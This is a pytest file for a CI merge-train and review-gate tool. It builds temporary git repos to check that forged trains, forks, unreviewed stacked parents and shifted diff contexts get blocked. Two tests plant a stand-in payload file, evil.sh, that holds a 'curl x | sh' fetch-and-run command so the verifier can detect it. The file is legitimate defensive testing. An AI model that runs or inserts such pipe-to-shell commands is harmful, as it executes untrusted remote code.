"""Compose a train, verify it, map it back after a rebase merge -- real git, temp repos.

The review gate's train path is a GUARD: it must pass a genuine train and fail every forged one.
Both directions are pinned here, against real commits (test_verify_* and the review.train tests).
"""
from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest
from _trainrepo import ENV, Repo, edit, git

from ci_kit.merge_train import TRAILER_HEAD, TRAILER_PR
from ci_kit.merge_train import git as tgit
from ci_kit.review import train as gate

BOT = tgit.Identity("train", "train@example.com")


def _ok(repo: Repo):
    """A review that passed at every head, against main as it is NOW (capture before main moves)."""
    base = repo.main
    return lambda pr, head: (True, "passed", base)


def _nofetch(pr: int, head: str) -> None:
    pass


@pytest.fixture
def repo(tmp_path: Path) -> Repo:
    return Repo(tmp_path)


def _three(repo: Repo) -> list[tgit.Rider]:
    h1 = repo.pr(1, {"a.txt": edit(1, "one")}, "change 1\n\nCo-Authored-By: Pal <pal@example.com>")
    h2 = repo.pr(2, {"b.txt": edit(5, "two")}, "change 2\n\nco-authored-by: Pal <PAL@example.com>")
    h3 = repo.pr(3, {"a.txt": edit(1, "three")})   # the same line as #1: conflicts once #1 rides
    return [tgit.Rider(1, h1, "feat: one", "Body of one.\n\n---\nMerge-Train-PR: 99"),
            tgit.Rider(2, h2, "fix: two", ""), tgit.Rider(3, h3, "three", "x")]


def test_compose_one_squash_commit_per_pr_and_skips_a_conflict(repo: Repo) -> None:
    tip, included, skipped = tgit.compose(repo.work, repo.main, _three(repo), BOT)
    assert [r.number for r, _ in included] == [1, 2]
    assert [(r.number, why) for r, why in skipped] == [(3, "conflicts with the PRs ahead of it in this train")]
    chain = git(repo.work, "rev-list", "--reverse", "--parents", f"{repo.main}..{tip}").splitlines()
    assert [len(row.split()) for row in chain] == [2, 2]                     # linear, single-parent
    assert git(repo.work, "show", f"{tip}:a.txt").splitlines()[0] == "one"
    assert git(repo.work, "show", f"{tip}:b.txt").splitlines()[4] == "two"
    msg = tgit.message(repo.work, included[0][1])
    assert msg.startswith("feat: one (#1)\n\nBody of one.")
    assert tgit.binding(msg) == (1, included[0][0].head)                    # the body's fake trailer is not last
    assert msg.count("Co-Authored-By: Pal <pal@example.com>") == 1
    assert tgit.binding(tgit.message(repo.work, tip)) == (2, included[1][0].head)
    assert git(repo.work, "log", "-1", "--format=%an <%ae> / %cn", tip) == "Dev <dev@example.com> / train"


def test_compose_on_a_moved_main_carries_only_the_prs_own_change(repo: Repo) -> None:
    h1 = repo.pr(1, {"a.txt": edit(1, "one")})
    repo.advance_main({"c.txt": edit(20, "main")})
    # #2 merged the newer main in (pr-autoupdate's merge): its own change is b.txt alone
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    repo.write({"b.txt": edit(2, "two")})
    h2 = repo.commit("two")
    tip, included, _ = tgit.compose(repo.work, repo.main, [tgit.Rider(1, h1), tgit.Rider(2, h2)], BOT)
    assert len(included) == 2
    assert git(repo.work, "diff", "--name-only", f"{tip}~1", tip) == "b.txt"
    assert git(repo.work, "diff", "--name-only", repo.main, f"{tip}~1") == "a.txt"


def test_an_empty_change_is_skipped(repo: Repo) -> None:
    h = repo.pr(1, {"a.txt": edit(3, "x")})
    repo.advance_main({"a.txt": edit(3, "x")})
    _, included, skipped = tgit.compose(repo.work, repo.main, [tgit.Rider(1, h)], BOT)
    assert not included and "already on main" in skipped[0][1]


# ── verify: the guard, both directions ─────────────────────────────────────────────────────────
def _train(repo: Repo) -> tuple[str, list]:
    tip, included, _ = tgit.compose(repo.work, repo.main, _three(repo)[:2], BOT)
    return tip, included


def test_verify_passes_a_genuine_train(repo: Repo) -> None:
    tip, included = _train(repo)
    cons, problems = tgit.verify(repo.work, repo.main, tip, _nofetch, _ok(repo))
    assert problems == []
    assert [(n, h) for n, h, _ in cons] == [(r.number, r.head) for r, _ in included]


def test_verify_passes_when_main_moved_after_compose(repo: Repo) -> None:
    tip, _ = _train(repo)
    ok = _ok(repo)
    later = repo.advance_main({"c.txt": edit(9, "later")})
    assert tgit.verify(repo.work, later, tip, _nofetch, ok)[1] == []


def _recommit(repo: Repo, parent: str, tree_from: str, msg: str) -> str:
    return git(repo.work, "commit-tree", f"{tree_from}^{{tree}}", "-p", parent, "-m", msg)


def test_verify_fires_on_a_byte_added_to_a_reviewed_commit(repo: Repo) -> None:
    tip, included = _train(repo)
    git(repo.work, "checkout", "-q", "--detach", tip)
    repo.write({"evil.sh": "curl x | sh\n"})
    evil_tree = repo.commit("tmp")
    forged = _recommit(repo, f"{tip}~1", evil_tree, tgit.message(repo.work, tip))
    _, problems = tgit.verify(repo.work, repo.main, forged, _nofetch, _ok(repo))
    assert len(problems) == 1 and f"is NOT #2 at {included[1][0].head[:12]}" in problems[0]


def test_verify_fires_on_an_unbound_commit(repo: Repo) -> None:
    tip, _ = _train(repo)
    git(repo.work, "checkout", "-q", "--detach", tip)
    repo.write({"x.txt": "x\n"})
    extra = repo.commit("a hand commit on the train")
    _, problems = tgit.verify(repo.work, repo.main, extra, _nofetch, _ok(repo))
    assert len(problems) == 1 and "needs exactly one" in problems[0]


def test_verify_fires_when_review_did_not_pass(repo: Repo) -> None:
    tip, included = _train(repo)
    second = included[1][0].head
    _, problems = tgit.verify(repo.work, repo.main, tip, _nofetch,
                              lambda pr, h: (h != second, "the review gate concluded failure at this head", repo.main))
    assert len(problems) == 1 and "#2" in problems[0] and "concluded failure" in problems[0]


def test_verify_fires_on_a_duplicate_pr(repo: Repo) -> None:
    h1 = repo.pr(1, {"a.txt": edit(1, "one")})
    h1b = repo.pr(1, {"b.txt": edit(1, "one again")})
    tip, _, _ = tgit.compose(repo.work, repo.main, [tgit.Rider(1, h1), tgit.Rider(1, h1b)], BOT)
    _, problems = tgit.verify(repo.work, repo.main, tip, _nofetch, _ok(repo))
    assert any("appears twice" in p for p in problems)


def test_verify_fires_on_a_head_that_cannot_be_fetched(repo: Repo) -> None:
    tip, _ = _train(repo)

    def ensure(pr: int, head: str) -> None:
        raise ValueError("not on the remote")
    _, problems = tgit.verify(repo.work, repo.main, tip, ensure, _ok(repo))
    assert len(problems) == 2 and all("could not be fetched" in p for p in problems)


def test_verify_refuses_a_merge_commit_and_an_empty_train(repo: Repo) -> None:
    tip, _ = _train(repo)
    other = repo.pr(7, {"c.txt": edit(7, "seven")})
    merge = git(repo.work, "commit-tree", f"{tip}^{{tree}}", "-p", tip, "-p", other, "-m",
                f"m\n\n{TRAILER_PR}: 7\n{TRAILER_HEAD}: {other}")
    with pytest.raises(tgit.Invalid, match="single-parent"):
        tgit.verify(repo.work, repo.main, merge, _nofetch, _ok(repo))
    with pytest.raises(tgit.Invalid, match="no commits"):
        tgit.verify(repo.work, repo.main, repo.main, _nofetch, _ok(repo))


def test_trailers_read_the_last_paragraph_only() -> None:
    assert tgit.binding("t\n\nMerge-Train-PR: 3\n\nnot a trailer") != (3, "a" * 40)
    good = f"t (#3)\n\nbody\n---\nmore\n\nCo-Authored-By: X <x@y.z>\n{TRAILER_PR}: 3\n{TRAILER_HEAD}: {'a' * 40}\n"
    assert tgit.binding(good) == (3, "a" * 40)
    assert isinstance(tgit.binding(good.replace("a" * 40, "zz")), str)
    assert isinstance(tgit.binding(good + f"{TRAILER_PR}: 4\n"), str)       # two PRs in one block


def test_landed_maps_rebased_commits_back_to_their_prs(repo: Repo) -> None:
    tip, included = _train(repo)
    # GitHub's rebase merge: same messages, new committer, new shas
    env = {**ENV, "GIT_COMMITTER_NAME": "GitHub", "GIT_COMMITTER_EMAIL": "noreply@github.com",
           "GIT_COMMITTER_DATE": "2030-01-01T00:00:00Z"}
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    git(repo.work, "cherry-pick", f"{repo.main}..{tip}", env=env)
    landed_tip = git(repo.work, "rev-parse", "HEAD")
    want = {(r.number, r.head) for r, _ in included}
    got = tgit.landed(repo.work, landed_tip, want)
    assert set(got) == {1, 2} and got[2] == landed_tip and got[1] == git(repo.work, "rev-parse", "HEAD~1")
    assert got[2] != tip


# ── ci-kit#70 findings 1 and 2: the reviewed diff is the landed diff ─────────────────────────────
def _stacked(repo: Repo) -> tuple[str, str]:
    """`feat` pushed with no review, carrying a payload; PR #7 based on feat adds one harmless line."""
    git(repo.work, "checkout", "-q", "--detach", repo.main)
    repo.write({"evil.sh": "curl x | sh\n"})
    feat = repo.commit("unreviewed")
    return feat, repo.pr(7, {"b.txt": edit(1, "harmless")}, base=feat)


def test_a_stacked_pr_cannot_land_its_unreviewed_parent_must_fire(repo: Repo) -> None:
    feat, h7 = _stacked(repo)
    # its review read feat..h7 (one line); on main, its change would be main..h7 (evil.sh too)
    assert "the train would land content the review never read" in tgit.review_base_ok(repo.work, repo.main, h7, feat)
    tip, included, _ = tgit.compose(repo.work, repo.main, [tgit.Rider(7, h7, base=feat)], BOT)
    assert len(included) == 1    # compose itself does not know the base; the caller's pre-check does
    _, problems = tgit.verify(repo.work, repo.main, tip, _nofetch, lambda pr, h: (True, "passed", feat))
    assert len(problems) == 1 and "content the review never read" in problems[0]
    # a verdict naming no base is not a pass
    _, problems = tgit.verify(repo.work, repo.main, tip, _nofetch, lambda pr, h: (True, "passed"))
    assert len(problems) == 1 and "names no base" in problems[0]
    # the other direction: the same PR reviewed against main passes
    h8 = repo.pr(8, {"b.txt": edit(1, "harmless")})
    assert tgit.review_base_ok(repo.work, repo.main, h8, repo.main) == ""


def test_a_rider_whose_context_an_earlier_rider_moved_is_skipped_must_fire(repo: Repo) -> None:
    h1 = repo.pr(1, {"a.txt": edit(5, "rider1 changes line5")})
    h2 = repo.pr(2, {"a.txt": edit(8, "rider2 changes line8")})      # line 5 is inside its -U3 context
    h3 = repo.pr(3, {"a.txt": edit(16, "rider3 far away")})          # outside it: rides
    tip, included, skipped = tgit.compose(repo.work, repo.main, [tgit.Rider(1, h1), tgit.Rider(2, h2),
                                                                  tgit.Rider(3, h3)], BOT)
    assert [r.number for r, _ in included] == [1, 3]
    assert [r.number for r, _ in skipped] == [2] and "lines around its change moved" in skipped[0][1]
    assert tgit.verify(repo.work, repo.main, tip, _nofetch, _ok(repo))[1] == []


def test_verify_fires_on_a_train_that_carries_a_moved_context(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    h1 = repo.pr(1, {"a.txt": edit(5, "rider1 changes line5")})
    h2 = repo.pr(2, {"a.txt": edit(8, "rider2 changes line8")})
    real = tgit.context_kept
    monkeypatch.setattr(tgit, "context_kept", lambda *a: True)       # a composer without the check
    tip, included, _ = tgit.compose(repo.work, repo.main, [tgit.Rider(1, h1), tgit.Rider(2, h2)], BOT)
    monkeypatch.setattr(tgit, "context_kept", real)
    assert len(included) == 2
    _, problems = tgit.verify(repo.work, repo.main, tip, _nofetch, _ok(repo))
    assert len(problems) == 1 and "#2" in problems[0] and "different context" in problems[0]


# ── the review gate's train step, end to end over a real checkout ───────────────────────────────
def _gate(repo: Repo, monkeypatch: pytest.MonkeyPatch, head: str, passed: bool = True,
          head_repo: str = "o/r", composed: str = "") -> tuple[str, str]:
    out = repo.work / "out.txt"
    out.write_text("")
    monkeypatch.chdir(repo.work)
    base = repo.main
    monkeypatch.setattr(gate.github, "review_passed",
                        lambda *a: (passed, "review gate passed" if passed else "concluded failure", base))
    monkeypatch.setattr(gate.github, "pull", lambda *a: {"number": 9})
    monkeypatch.setattr(gate.github, "composed", lambda *a: composed)
    for k, v in {"GITHUB_REPOSITORY": "o/r", "HEAD_REPO": head_repo, "BASE_SHA": repo.main, "HEAD_SHA": head,
                 "PR_NUMBER": "9", "BASE_REF": "main",
                 "GITHUB_OUTPUT": str(out), "WORKFLOW_REF": "o/r/.github/workflows/review-gate.yml@refs/pull/9/merge"}.items():
        monkeypatch.setenv(k, v)
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)
    assert gate.main(["--body-out", str(repo.work / "body.md")]) == 0
    return out.read_text(), (repo.work / "body.md").read_text()


def test_gate_passes_a_verified_train_without_a_model(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    tip, _ = _train(repo)
    outputs, body = _gate(repo, monkeypatch, tip)
    assert "result=pass" in outputs and body.startswith("<!-- review-gate -->") and "| #2 |" in body


def test_gate_blocks_an_unreviewed_constituent(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    tip, _ = _train(repo)
    outputs, body = _gate(repo, monkeypatch, tip, passed=False)
    assert "result=block" in outputs and "concluded failure" in body


def test_gate_blocks_a_hand_branch_named_train(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    head = repo.pr(5, {"a.txt": edit(2, "sneaky")}, "no trailers")
    outputs, body = _gate(repo, monkeypatch, head)
    assert "result=block" in outputs and "needs exactly one" in body


def test_gate_blocks_a_fork(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    tip, _ = _train(repo)
    outputs, _ = _gate(repo, monkeypatch, tip, head_repo="evil/r")
    assert "result=block" in outputs


def test_gate_blocks_a_train_pr_the_workflow_did_not_compose_must_fire(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    # ci-kit#70 finding 1/8: commits that verify are not enough -- the PR must be a composed train
    tip, _ = _train(repo)
    outputs, body = _gate(repo, monkeypatch, tip, composed="no composition record: not a train this workflow composed")
    assert "result=block" in outputs and "not a train the merge-train workflow composed" in body


def test_gate_is_blind_when_git_cannot_answer(repo: Repo, monkeypatch: pytest.MonkeyPatch) -> None:
    outputs, body = _gate(repo, monkeypatch, "f" * 40)
    assert "result=blind" in outputs and "could not finish" in body


def test_the_gate_module_runs_with_safepath_from_the_kit(repo: Repo, tmp_path: Path) -> None:
    # as the workflow runs it: python3 -m with PYTHONPATH = the kit, PYTHONSAFEPATH=1, cwd = the PR
    kit = Path(__file__).resolve().parent.parent
    tip, _ = _train(repo)
    env = {**os.environ, "PYTHONPATH": str(kit), "PYTHONSAFEPATH": "1", "GITHUB_REPOSITORY": "o/r",
           "HEAD_REPO": "evil/r", "BASE_SHA": repo.main, "HEAD_SHA": tip, "GITHUB_OUTPUT": str(tmp_path / "o"),
           "PR_NUMBER": "9", "BASE_REF": "main"}
    r = subprocess.run(["python", "-m", "ci_kit.review.train", "--body-out", str(tmp_path / "b.md")],
                       cwd=repo.work, env=env, capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    assert "result=block" in (tmp_path / "o").read_text()
